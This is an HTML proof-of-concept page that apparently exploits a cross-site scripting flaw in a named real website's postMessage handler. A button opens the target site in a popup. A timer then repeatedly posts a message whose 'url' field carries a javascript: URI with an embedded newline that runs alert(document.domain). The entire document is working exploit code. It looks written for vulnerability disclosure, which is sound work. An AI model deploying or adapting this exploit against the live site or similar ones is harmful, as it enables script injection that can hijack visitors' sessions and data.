<html>
  <body>
    <h1>Click to Launch XSS PoC</h1>
    <button id="trigger">Click Me</button>

    <script>
      document.getElementById('trigger').addEventListener('click', () => {
        // OPEN the vulnerable WordPress site (popup will NOT be blocked now)
        const vuln_window = window.open("https://zerodha.com/z-connect/", "_blank");

        // Start sending messages AFTER the window is opened
        const payload = {
          type: 'subscriptionModalShow',
          data: {
            email: 'xss@xss.com',
            url: 'javascript://zerodha.com/z-connect/%0Aalert(document.domain)'
          }
        };

        // Send message repeatedly until popup is closed
        const interval = setInterval(() => {
          if (vuln_window.closed) {
            clearInterval(interval);
          } else {
            vuln_window.postMessage(payload, '*');
          }
        }, 500);
      });
    </script>
  </body>
</html>
